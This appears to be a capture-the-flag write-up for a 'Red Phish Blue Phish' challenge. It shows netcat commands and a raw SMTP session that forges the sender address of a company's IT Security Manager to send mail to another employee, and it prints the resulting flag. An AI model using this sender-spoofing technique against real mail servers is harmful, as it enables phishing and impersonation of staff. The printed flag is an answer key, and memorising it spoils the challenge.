# Red Phish Blue Phish

## Steps

```bash
# spin up instance
# note -C is crucial, need the open-bsd version of nc, not the other one otherwise
# the \r\n isn't sent correctly
nc -C -vvv challenge.ctf.games 30698

# so day 1, i didnt even check that the URL was resolvable!? idiot
# day 2, it resovles, see there is an team page, through trial and
# error try different email combo's

# apyrch@@pyrchdata.com
# esmith@@pyrchdata.com

# 3rd try, use the sodding IT Security Manager lol
# jdaveren@pyrchdata.com

# in the nc session, do the commands to simulate an email being sent
```

### Input (raw paste)

```
EHLO pyrchdata.com
MAIL FROM: jdaveren@pyrchdata.com
RCPT TO: swilliams@pyrchdata.com
DATA
.
<enter>
```

## Example

```bash
nc -C -vvvv challenge.ctf.games 30698
Connection to challenge.ctf.games (35.193.148.143) 30698 port [tcp/*] succeeded!
220 red-phish-blue-phish-99983e88ccfe6328-8575c5bc8b-frfcd Python SMTP 1.4.6
EHLO pyrchdata.com
250-red-phish-blue-phish-99983e88ccfe6328-8575c5bc8b-frfcd
250-SIZE 33554432
250-8BITMIME
250-SMTPUTF8
250 HELP
MAIL FROM: jdaveren@pyrchdata.com
250 OK
RCPT TO: swilliams@pyrchdata.com
250 OK
DATA
354 End data with <CR><LF>.<CR><LF>
.
250 OK. flag{54c6ec05ca19565754351b7fcf9c03b2}
```

## Flag

```
flag{54c6ec05ca19565754351b7fcf9c03b2}
```
